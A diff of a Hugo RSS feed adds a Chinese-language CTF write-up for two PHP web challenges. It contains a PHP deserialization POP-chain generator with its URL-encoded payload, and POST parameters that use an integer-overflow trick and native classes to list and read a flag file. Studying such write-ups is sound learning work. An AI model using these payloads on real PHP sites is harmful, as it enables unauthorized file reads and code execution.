@@ -1,4 +1,108 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>wp on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/wp/</link><description>Recent content in wp on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 17 Feb 2022 01:09:02 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/wp/index.xml" rel="self" type="application/rss+xml"/><item><title>defcampCTF2022 Wp</title><link>https://amiaaaz.github.io/2022/02/17/defcampctf2022-wp/</link><pubDate>Thu, 17 Feb 2022 01:09:02 +0800</pubDate><guid>https://amiaaaz.github.io/2022/02/17/defcampctf2022-wp/</guid><description>&lt;p>其余的看wp云了&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>wp on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/wp/</link><description>Recent content in wp on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 28 Mar 2022 10:04:27 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/wp/index.xml" rel="self" type="application/rss+xml"/><item><title>CTFshow0222卷王杯 Wp</title><link>https://amiaaaz.github.io/2022/03/28/ctfshow-0222-juanwangcup-wp/</link><pubDate>Mon, 28 Mar 2022 10:04:27 +0800</pubDate><guid>https://amiaaaz.github.io/2022/03/28/ctfshow-0222-juanwangcup-wp/</guid><description>&lt;h2 id="easy-unserialize">easy unserialize&lt;/h2>
+&lt;p>一个pop链的构造和throw error的绕过&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$talk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;111&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag{here}&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">one&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$object&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// new second();
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">MeMeMe&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">array_walk&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$fn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$prev&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$fn&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;Happy_func&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">$prev&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;year_parm&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;success&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">$talk&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">$talk&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;/br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// get flag here [7]
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">object&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#75715e">// second::__call [1]
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__toString&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">object&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">string&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// third::__get [4]
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">second&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// new one();
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">addMe&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Wow you have sovled&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// one::__toString [3]
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__call&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$args&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 不存在方法
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">call_user_func&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;Me&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$args&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// second::addMe [2]
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// one::MeMeMe [6]
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">third&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$string&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$string&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 构造pop时注意手动添加这个构造方法 或者直接赋值也可
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$string&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$name&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 不存在属性
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$var&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#111">$name&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$var&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$name&lt;/span>&lt;span style="color:#111">]();&lt;/span> &lt;span style="color:#75715e">// second::__call [5]
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$one&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">one&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$one2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">one&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$one3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">one&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$third&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">third&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#d88200">&amp;#39;string&amp;#39;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$one3&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;MeMeMe&amp;#39;&lt;/span>&lt;span style="color:#111">]]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$one2&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">object&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$third&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$second&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">second&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$one2&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$one3&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">year_parm&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;Happy_func&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$one&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">object&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$second&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// unserialize(serialize($one));
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$one&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">));&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>修改&lt;code>i:0&lt;/code>&lt;/p>
+&lt;pre tabindex="0">&lt;code>a%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3BO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BN%3Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7Di%3A0%3BN%3B%7D
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220328095807012.png" alt="image-20220328095807012">&lt;/p>
+&lt;h2 id="easyweb">easyweb&lt;/h2>
+&lt;p>页面源码提示&lt;code>/?source&lt;/code>&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php+HTML" data-lang="php+HTML">&amp;lt;?php
+error_reporting(0);
+if(isset($_GET[&amp;#39;source&amp;#39;])){
+highlight_file(__FILE__);
+echo &amp;#34;\$flag_filename = &amp;#39;flag&amp;#39;.md5(???).&amp;#39;php&amp;#39;;&amp;#34;;
+die();
+}
+if(isset($_POST[&amp;#39;a&amp;#39;]) &amp;amp;&amp;amp; isset($_POST[&amp;#39;b&amp;#39;]) &amp;amp;&amp;amp; isset($_POST[&amp;#39;c&amp;#39;])){
+$c = $_POST[&amp;#39;c&amp;#39;];
+$count[++$c] = 1;
+if($count[] = 1) { // ???
+$count[++$c] = 1;
+print_r($count);
+die();
+}else{
+$a = $_POST[&amp;#39;a&amp;#39;];
+$b = $_POST[&amp;#39;b&amp;#39;];
+echo new $a($b); // 原生类
+}
+}
+?&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>原生类我知道，但是我注释&lt;code>???&lt;/code>的地方卡了好久，后来知道这里考的是数组溢出（淦&lt;/p>
+&lt;pre tabindex="0">&lt;code>c=9223372036854775806&amp;amp;a=DirectoryIterator&amp;amp;b=glob://flag[0-9a-z]*.php
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>c=9223372036854775806&amp;amp;a=SplFileObject&amp;amp;b=flag56ea8b83122449e814e0fd7bfb5f220a.php
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220328100255829.png" alt="image-20220328100255829">&lt;/p>
+&lt;hr>
+&lt;p>不摆烂从我做起（x&lt;/p></description></item><item><title>defcampCTF2022 Wp</title><link>https://amiaaaz.github.io/2022/02/17/defcampctf2022-wp/</link><pubDate>Thu, 17 Feb 2022 01:09:02 +0800</pubDate><guid>https://amiaaaz.github.io/2022/02/17/defcampctf2022-wp/</guid><description>&lt;p>其余的看wp云了&lt;/p>
 &lt;p>&lt;a href="https://dctf21.cyberedu.ro/#challenges">https://dctf21.cyberedu.ro/#challenges&lt;/a>&lt;/p>
 &lt;p>&lt;a href="https://ctftime.org/event/1560/tasks/">https://ctftime.org/event/1560/tasks/&lt;/a>&lt;/p>
 &lt;p>&lt;a href="http://www.yongsheng.site/2022/02/14/DefCamp%20CTF(D-CTF)2021-22%20web/">http://www.yongsheng.site/2022/02/14/DefCamp%20CTF(D-CTF)2021-22%20web/&lt;/a>&lt;/p>
